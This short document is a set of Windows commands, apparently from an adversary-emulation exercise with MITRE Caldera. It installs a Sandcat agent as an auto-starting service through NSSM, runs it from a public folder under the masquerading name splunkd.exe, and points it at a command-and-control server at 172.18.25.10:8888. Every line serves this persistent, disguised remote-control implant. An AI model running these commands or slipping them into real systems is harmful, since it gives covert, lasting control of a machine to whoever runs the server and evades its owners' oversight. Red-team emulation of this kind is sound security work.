C:\Tools\nssm.exe install SandcatAgent C:\Users\Public\splunkd.exe -server http://172.18.25.10:8888 -group red
sc config SandcatAgent start= auto
sc description SandcatAgent "Sandcat agent service for Caldera connection."
sc start SandcatAgent
